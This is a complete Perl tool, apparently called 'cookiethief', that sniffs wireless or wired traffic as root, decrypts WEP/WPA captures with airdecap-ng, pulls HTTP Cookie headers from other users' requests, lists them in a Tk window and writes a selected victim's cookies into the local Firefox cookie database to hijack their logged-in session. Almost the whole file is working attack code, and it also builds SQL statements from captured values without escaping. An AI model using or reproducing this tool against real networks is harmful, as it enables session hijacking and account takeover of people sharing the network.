# This script requires: wireshark (dumpcap), aircrack-ng Suite, Tk
use strict;
use DateTime;
use Net::Pcap ':functions';
use Net::Pcap::Reassemble;
use NetPacket::Ethernet;
use NetPacket::IP;
use DBI;
use DBD::SQLite;
use Tk;
use Tk::MsgBox;


my ($top, $lst, $cookie_db, $if, $is_wifi, $is_wpa, $essid, $if_key, $monitor_mode, $t, %box);

sub suicide {
 system("pkill dumpcap");
 Tk::exit;
}

sub start_session {
  my $e = $lst->get( $lst->curselection->[0] );
  my ($src_ip, $complete_host) = $e =~ /<(.+)> \[(.+)\]/;
  my ($basedomain) = $complete_host =~ /\.(.+\..+)$/;
  my $lock = $cookie_db;
  $lock =~ s/[^\/]+$/lock/;
  if (-l $lock) {
    $top->MsgBox( -icon => 'info', -title => 'Cookie DB Locked', -message => "Cookie Database $cookie_db is currently locked.\n".
		  "Terminate Firefox to unlock it and possibly start another spoofed session.", -type => 'ok' )->Show;
    return;
  }
  my $dbh = DBI->connect("dbi:SQLite:dbname=$cookie_db",'','', { AutoCommit => 1, sqlite_use_immediate_transaction => 1 });
  my $sth = $dbh->prepare(" DELETE FROM moz_cookies WHERE baseDomain LIKE '%$basedomain%' OR host LIKE '%$complete_host%' ");
  $sth->execute;
  my %cookies = %{$box{$src_ip}->{$complete_host}};
  my $expiry = DateTime->now->add( years => 2 )->epoch;
  foreach my $key (keys %cookies) { 
    $complete_host = '.' . $complete_host if ($complete_host eq $basedomain);
    $sth = $dbh->prepare(" INSERT INTO moz_cookies(name, value, host, path, expiry, isSecure, isHttpOnly)
			   VALUES('$key', '$cookies{$key}', '$complete_host', '/', $expiry, 0, 0) ");
    $sth->execute;
  }
  $dbh->disconnect;
  $complete_host =~ s/^\.//;
  system("firefox $complete_host &");
}

sub pick_mozilla_cookiedb {
  print "Trying to determine a local firefox cookie SQLite Database... ";
  open(my $moz_profiles, $ENV{HOME}."/.mozilla/firefox/profiles.ini");
  my $db_path;
  while (my $row = <$moz_profiles>) {
    if ($row =~ /Path=/) {
      ($db_path) = $row =~ /Path=(.+)/;
      last;
    }
  }
  close $moz_profiles;
  my $db = $ENV{HOME}."/.mozilla/firefox/".$db_path."/cookies.sqlite";
  if (-w $db) {
    print "OK $db\n";
  } else {
    die "ERROR: No firefox cookie database found.\n";
  }
  return $db;
}

sub store_cookie {
  my ($ref, $cookie) = @_;
  $cookie =~ s/\s//g;
  my @cookies = split(';', $cookie);
  foreach my $c (@cookies) {
    my ($name, $value) = $c =~ /^(.+)\=(.+)$/;
    ${$ref}->{$name} = $value;
  }
}

sub process_packet {
  shift;
  my ($header, $packet) = @_;
  my ($host, $cookie_hdr);
  if ($packet =~ /Cookie:/) { # If this packet contains a cookie... steal it ;)
    ($host) = $packet =~ /Host: ([^\cM]+)/;
    ($cookie_hdr) = $packet =~ /Cookie: ([^\cM\cJ]+)/;
    my $ip_obj = NetPacket::IP->decode(NetPacket::Ethernet::strip($packet));
    if (not exists $box{$ip_obj->{src_ip}}->{$host}) {
      my $ref = \$box{$ip_obj->{src_ip}}->{$host};
      store_cookie($ref, $cookie_hdr);
      my ($cook) = $cookie_hdr =~ /^(.{1,30})/;
      $lst->insert('end', "<$ip_obj->{src_ip}> [$host] $cook");
    }
  }
}

sub airdecap {
  if ($is_wpa) {
    system("airdecap-ng -e $essid -p $if_key cookiethief.cap"); # Extract WPA/WPA2 packets
  } elsif ($if_key) {
    system("airdecap-ng -w $if_key cookiethief.cap"); # Extract WEP packets
  } elsif ($is_wifi) {
    system("airdecap-ng cookiethief.cap") if ($is_wifi); # Extract plaintext packets
  }
}

sub parse_capture {
  system("pkill dumpcap");
  print "\nParsing...\n";
  airdecap;
  my ($err, $filter, $suffix);
  $suffix = '-dec' if ($is_wifi);
  my $pcap = pcap_open_offline("cookiethief$suffix.cap", \$err) or die "ERROR Can't read 'cookiethief-dec.cap': $err.\n";
  pcap_compile($pcap, \$filter, "tcp port 80 or tcp port 8080", 1, 0);
  pcap_setfilter($pcap, $filter);
  Net::Pcap::Reassemble::loop($pcap, 1000, \&process_packet, 0);
  pcap_close($pcap);
  pcap_freecode($filter);
  unless (fork) {
    system("dumpcap -w cookiethief.cap -i $if $monitor_mode -Z none -B 1 >/dev/null 2>&1");
    exit;
  }
  $SIG{ALRM} = \&parse_capture;
  alarm $t;
}

sub is_wifi {
  my $if = shift;
  open(my $iw, "iwconfig 2>&1 |");
  while (my $row = <$iw>) {
    return 0 if ($row =~ /$if.+no wireless extensions/);
  }
  return 1;
}

die "NOT ROOT" unless ($< == 0);
print "Sniffing Interface: ";
$if = <STDIN>;
chomp $if;
$is_wifi = is_wifi($if);
if ($is_wifi) {
  print "Getting $if network Key to Decrypt IEEE802.11 packets... ";
  open(my $iwconfig, "iwconfig 2>/dev/null|");
  my $cur_block;
  while (my $row = <$iwconfig>) {
    ($cur_block) = $row =~ /^([^\s]+)\s+IEEE 802/ if $row =~ /^.+\s+IEEE 802/;
    if ($cur_block eq $if) {
      if ($row =~ /Encryption key:/) {
	($if_key) = $row =~ /Encryption key:(.+)$/;
	$if_key =~ s/\-//g;
	last;
      }
    }
  }
}
if ($if_key) {
  print "OK $if_key\n";
} else {
  print "WARNING Cannot find Network Key, trying to steal only from plaintext packets.\n";
}
print "Capture Check Interval (in seconds): ";
$t = <STDIN>;
chomp $t;
print "OK\n\n---\n\nCreating Monitor Interface...\n";
open(my $airmon, "airmon-ng start $if|");
my $old_if = $if;
my $monitor_mode = ' -I ';
while (my $row = <$airmon>) {
  print $row;
  ($if) = $row =~ /monitor mode enabled on ([^\)]+)\)/;
}
unless ($if) {
  print "WARNING Falling back to generic IF $old_if\n";
  $if = $old_if;
  $monitor_mode = '';
}
close $airmon;

$cookie_db = pick_mozilla_cookiedb;

print "Binding SIGALRM parse callback ($t seconds)... ";
$SIG{ALRM} = \&parse_capture;
alarm $t;
print "OK\n";
print "Starting capture... \n";
unless (fork) {
  system("dumpcap -w cookiethief.cap -i $if $monitor_mode -Z none -B 1 >/dev/null 2>&1");
  exit;
}

$SIG{INT} = \&suicide;
$top = new MainWindow( -title => 'Sniffing...' );
my $kill = $top->Button ( -text => 'Kill Sniffing', -command => \&suicide )->pack;
$lst = $top->Listbox( -selectmode => 'single', -width => '70')->pack;
my $but = $top->Button( -text => 'Open selected session with stolen COOKIE', -command => \&start_session)->pack;
MainLoop;
